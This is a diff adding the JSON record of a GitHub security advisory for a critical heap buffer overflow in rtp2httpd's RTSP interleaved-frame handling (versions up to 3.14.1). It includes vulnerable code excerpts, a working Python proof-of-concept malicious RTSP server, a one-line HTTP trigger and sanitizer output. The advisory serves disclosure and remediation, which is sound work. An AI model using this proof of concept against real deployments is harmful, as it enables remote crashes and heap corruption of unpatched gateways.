@@ -1,0 +1,127 @@
+{
+  "ghsa_id": "GHSA-35fv-hf3m-2pqc",
+  "cve_id": null,
+  "url": "https://api.github.com/repos/stackia/rtp2httpd/security-advisories/GHSA-35fv-hf3m-2pqc",
+  "html_url": "https://github.com/stackia/rtp2httpd/security/advisories/GHSA-35fv-hf3m-2pqc",
+  "summary": "Heap buffer overflow in RTSP interleaved-frame handling (unauthenticated, remotely triggerable)",
+  "description": "### Summary\r\n\r\nAn unauthenticated, remotely-reachable **heap buffer overflow** in rtp2httpd's RTSP TCP *interleaved* data path lets an attacker write up to ~2.5 KB of fully attacker-controlled data past a 1536-byte heap buffer. With UDPxy compatibility (on by default), a single HTTP request makes the gateway connect to an attacker-controlled RTSP server, which then overflows the buffer with one oversized interleaved frame. Confirmed remote denial of service (worker crash) with potential for further memory-corruption exploitation.\r\n\r\n### Details\r\n\r\nWhen an RTSP source is streamed over **TCP interleaved transport** (RTP framed inside the RTSP control connection, RFC 2326 §10.12), `rtsp_process_interleaved_buffer()` in `src/rtsp.c` reads the 16-bit frame length from the upstream and copies that many bytes into a fixed-size pool buffer. The length is validated only against the **source** buffer size, not the **destination**.\r\n\r\n`src/rtsp.c`:\r\n```c\r\n1792   uint16_t packet_length = (session->response_buffer[2] << 8) | session->response_buffer[3]; // attacker, 0..65535\r\n1795   if (session->response_buffer_pos < 4 + (size_t)packet_length)   // pos <= 4096  => packet_length <= 4092\r\n1796     break;\r\n1799   /* Sanity check: prevent processing packets that are too large */\r\n1800   if (packet_length > RTSP_RESPONSE_BUFFER_SIZE - 4) {            // 4092 — bounds against the SOURCE buffer\r\n1801     ... resync ...\r\n1816   }\r\n1822   if (channel == session->rtp_channel) {\r\n1823     buffer_ref_t *packet_buf = buffer_pool_alloc();              // ->data is 1536 bytes\r\n1825     memcpy(packet_buf->data, &session->response_buffer[4], packet_length);   // OVERFLOW when packet_length > 1536\r\n```\r\n\r\nSizes:\r\n- `src/rtsp.h:25` `RTSP_RESPONSE_BUFFER_SIZE 4096`; `response_buffer[4096]` is filled by `recv` up to 4096 (`src/rtsp.c:1874-1875`).\r\n- `src/buffer_pool.h:13` `BUFFER_POOL_BUFFER_SIZE 1536`; pool buffers are packed `data = segment->buffers + i*1536` (`src/buffer_pool.c:67`), the pool is created with element size 1536 (`src/zerocopy.c:91`).\r\n\r\nThe guard at line 1800 uses the wrong constant: it limits `packet_length` to the 4096-byte response buffer (≤ 4092) instead of the 1536-byte destination. Any interleaved frame whose declared length is **1537–4092** passes every check and overflows `packet_buf->data` by up to **2556 bytes**.\r\n\r\n**Reachability (unauthenticated, remote):**\r\n1. UDPxy compatibility defaults **on**: `src/configuration.c:1142-1143` `if (!cmd_udpxy_set) config.udpxy = 1;`.\r\n2. A client URL that doesn't match a configured service goes to the UDPxy parser (`src/connection.c:1021-1023`).\r\n3. `GET /rtsp/<host>:<port>/<path>` is routed to `service_create_from_rtsp_url()` (`src/service.c:1264-1266`), which builds the upstream URL directly from client input — `snprintf(rtsp_url, ..., \"rtsp://%s\", url_part)` (`src/service.c:1348`) — and connects there. So the client chooses the upstream RTSP host (SSRF-style).\r\n4. rtp2httpd's SETUP offers TCP interleaved transport by default (`src/rtsp.c:1535-1537`). The (attacker) upstream's SETUP response selects `interleaved=0-1`, which sets `session->rtp_channel` via `sscanf(transport, \"interleaved=%d-%d\", ...)` (`src/rtsp.c:2855`). The oversized frame then matches `channel == session->rtp_channel` and reaches the `memcpy`.\r\n\r\nAdditional reach paths (no UDPxy needed): a malicious/compromised *configured* RTSP upstream, or an on-path attacker (RTSP interleaved is plaintext TCP).\r\n\r\n### PoC\r\n\r\nVerified on Linux (Debian, gcc 15.2) with AddressSanitizer.\r\n\r\n**1. Build with ASan:**\r\n```sh\r\ncc -fsanitize=address -g -O0 -DPACKAGE='\"rtp2httpd\"' -DVERSION='\"poc\"' -Isrc \\\r\n   $(ls src/*.c | grep -v kqueue) -o r2h_asan -lpthread -lm\r\n```\r\n\r\n**2. Malicious RTSP server** (`rtsp_evil.py`) — completes the minimal handshake over TCP interleaved, then sends one oversized frame (length 4092 → 1536-byte destination):\r\n```python\r\nimport socket, struct, threading\r\nPORT, OVERSIZE = 8554, 4092\r\ndef handle(c):\r\n    buf = b\"\"\r\n    while True:\r\n        d = c.recv(4096)\r\n        if not d: break\r\n        buf += d\r\n        while b\"\\r\\n\\r\\n\" in buf:\r\n            req, buf = buf.split(b\"\\r\\n\\r\\n\", 1)\r\n            L = req.decode(\"latin1\").split(\"\\r\\n\"); m = L[0].split(\" \")[0]\r\n            cseq = next((x.split(\":\",1)[1].strip() for x in L if x.lower().startswith(\"cseq:\")), \"0\")\r\n            if m == \"OPTIONS\":\r\n                c.sendall(f\"RTSP/1.0 200 OK\\r\\nCSeq: {cseq}\\r\\nPublic: DESCRIBE, SETUP, PLAY, OPTIONS\\r\\n\\r\\n\".encode())\r\n            elif m == \"DESCRIBE\":\r\n                sdp = (\"v=0\\r\\no=- 0 0 IN IP4 127.0.0.1\\r\\ns=x\\r\\nc=IN IP4 127.0.0.1\\r\\n\"\r\n                       \"t=0 0\\r\\nm=video 0 RTP/AVP 33\\r\\na=control:track1\\r\\n\")\r\n                c.sendall((f\"RTSP/1.0 200 OK\\r\\nCSeq: {cseq}\\r\\nContent-Base: rtsp://127.0.0.1:{PORT}/\\r\\n\"\r\n                           f\"Content-Type: application/sdp\\r\\nContent-Length: {len(sdp)}\\r\\n\\r\\n{sdp}\").encode())\r\n            elif m == \"SETUP\":\r\n                c.sendall((f\"RTSP/1.0 200 OK\\r\\nCSeq: {cseq}\\r\\nSession: 12345678\\r\\n\"\r\n                           \"Transport: RTP/AVP/TCP;unicast;interleaved=0-1\\r\\n\\r\\n\").encode())\r\n            elif m == \"PLAY\":\r\n                c.sendall((f\"RTSP/1.0 200 OK\\r\\nCSeq: {cseq}\\r\\nSession: 12345678\\r\\n\\r\\n\").encode())\r\n                c.sendall(b\"$\" + bytes([0]) + struct.pack(\">H\", OVERSIZE) + b\"A\"*OVERSIZE)\r\n            else:\r\n                c.sendall(f\"RTSP/1.0 200 OK\\r\\nCSeq: {cseq}\\r\\n\\r\\n\".encode())\r\ns = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\ns.bind((\"127.0.0.1\", PORT)); s.listen(5)\r\nwhile True:\r\n    conn,_ = s.accept(); threading.Thread(target=handle, args=(conn,), daemon=True).start()\r\n```\r\n\r\n**3. Run and trigger** (the trigger is a single, unauthenticated HTTP request — default config, UDPxy on):\r\n```sh\r\npython3 rtsp_evil.py &\r\n./r2h_asan -l 127.0.0.1:5140 -w 1 -v 4 -C &\r\nprintf 'GET /rtsp/127.0.0.1:8554/track1 HTTP/1.1\\r\\nHost: x\\r\\nConnection: close\\r\\n\\r\\n' > /dev/tcp/127.0.0.1/5140\r\n```\r\n\r\n**Result** — AddressSanitizer aborts the worker:\r\n```\r\n==ERROR: AddressSanitizer: heap-buffer-overflow ... WRITE of size 4092 ...\r\n    #0 ... in __interceptor_memcpy\r\n    #1 ... in rtsp_process_interleaved_buffer src/rtsp.c:1825\r\n    #2 ... in rtsp_handle_tcp_interleaved_data src/rtsp.c:1892\r\n    #3 ... in rtsp_handle_socket_event src/rtsp.c:1061\r\n  ... is located 0 bytes after a 1536-byte region ... allocated by\r\n    ... buffer_pool_segment_create src/buffer_pool.c:52 / buffer_pool_init src/buffer_pool.c:91 / zerocopy_init src/zerocopy.c:91\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow src/rtsp.c:1825 in rtsp_process_interleaved_buffer\r\n```\r\n\r\n**Confirmation of attacker control (verified):**\r\n- *Write size is attacker-controlled.* Varying only the interleaved frame-length field changes the ASan write size 1:1 — length 4092 → `WRITE of size 4092`, 2000 → `2000`, 1600 → `1600`; at exactly 1536 (the destination size) there is **no** overflow. The overflow boundary is precisely the destination buffer size.\r\n- *Contents are attacker-controlled.* Replaying the exact `memcpy` (`src/rtsp.c:1825`) against the project's real `buffer_pool` allocator (no sanitizer, so the write completes), an adjacent pooled buffer pre-filled with `0xCC` is overwritten with the attacker's payload byte — all 464 overflow bytes (2000 − 1536) become `0x42`:\r\n  ```\r\n  neighbor BEFORE: cc cc cc cc cc cc cc cc ...\r\n  neighbor AFTER : 42 42 42 42 42 42 42 42 ...\r\n  ```\r\n  The out-of-bounds bytes land verbatim in the neighboring pool buffer, which holds live pointers and sizes in `buffer_ref_t` metadata.\r\n\r\n### Impact\r\n\r\n**CWE-787 Out-of-bounds Write / CWE-122 Heap-based Buffer Overflow** (root cause CWE-131, bounds check against the wrong buffer size).\r\n\r\n- **Who is impacted:** any deployment of rtp2httpd reachable by a party that can send it an HTTP request. Because UDPxy is enabled by default, that party can point the gateway at an attacker-controlled RTSP server with no authentication and no interaction from any other user. Deployments that proxy RTSP from untrusted/compromised upstreams, or where an attacker is on-path to the upstream, are also affected.\r\n- **Effect:** `memcpy` writes 1537–4092 attacker-chosen bytes past a 1536-byte allocation in the shared zero-copy buffer pool, corrupting adjacent pooled buffers and `buffer_ref_t` metadata (including pointers and sizes). Confirmed: immediate worker crash → **remote denial of service** (trivially repeatable; the supervisor restarts the worker each time). Because both the length and the full contents are attacker-controlled and overwrite heap control data, this should be treated as **potential remote code execution** pending exploitation analysis (code execution not demonstrated).\r\n- **Suggested CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (worst case); confirmed minimum is remote DoS + heap corruption.\r\n\r\n**Suggested fix:** bound the interleaved frame length against the destination (`BUFFER_POOL_BUFFER_SIZE`, 1536), not `RTSP_RESPONSE_BUFFER_SIZE - 4`, before the `memcpy` (and make the resync at line 1800 use that bound); or reject/resync interleaved frames larger than the pool buffer. Interleaved frames larger than the media MTU are not legitimate here.\r\n",
+  "severity": "critical",
+  "author": null,
+  "publisher": {
+    "login": "stackia",
+    "id": 5107241,
+    "node_id": "MDQ6VXNlcjUxMDcyNDE=",
+    "avatar_url": "https://avatars.githubusercontent.com/u/5107241?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/stackia",
+    "html_url": "https://github.com/stackia",
+    "followers_url": "https://api.github.com/users/stackia/followers",
+    "following_url": "https://api.github.com/users/stackia/following{/other_user}",
+    "gists_url": "https://api.github.com/users/stackia/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/stackia/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/stackia/subscriptions",
+    "organizations_url": "https://api.github.com/users/stackia/orgs",
+    "repos_url": "https://api.github.com/users/stackia/repos",
+    "events_url": "https://api.github.com/users/stackia/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/stackia/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-35fv-hf3m-2pqc",
+      "type": "GHSA"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-06-27T17:59:44Z",
+  "published_at": "2026-06-27T08:33:58Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "",
+        "name": "rtp2httpd"
+      },
+      "vulnerable_version_range": "<= 3.14.1",
+      "patched_versions": "3.14.2",
+      "vulnerable_functions": [
+
+      ]
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-122",
+      "name": "Heap-based Buffer Overflow"
+    },
+    {
+      "cwe_id": "CWE-131",
+      "name": "Incorrect Calculation of Buffer Size"
+    },
+    {
+      "cwe_id": "CWE-787",
+      "name": "Out-of-bounds Write"
+    }
+  ],
+  "cwe_ids": [
+    "CWE-122",
+    "CWE-131",
+    "CWE-787"
+  ],
+  "credits": [
+    {
+      "login": "NicPWNs",
+      "type": "reporter"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "NicPWNs",
+        "id": 23003787,
+        "node_id": "MDQ6VXNlcjIzMDAzNzg3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/23003787?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/NicPWNs",
+        "html_url": "https://github.com/NicPWNs",
+        "followers_url": "https://api.github.com/users/NicPWNs/followers",
+        "following_url": "https://api.github.com/users/NicPWNs/following{/other_user}",
+        "gists_url": "https://api.github.com/users/NicPWNs/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/NicPWNs/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/NicPWNs/subscriptions",
+        "organizations_url": "https://api.github.com/users/NicPWNs/orgs",
+        "repos_url": "https://api.github.com/users/NicPWNs/repos",
+        "events_url": "https://api.github.com/users/NicPWNs/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/NicPWNs/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "comments": 0,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "score": 9.8
+  }
+}
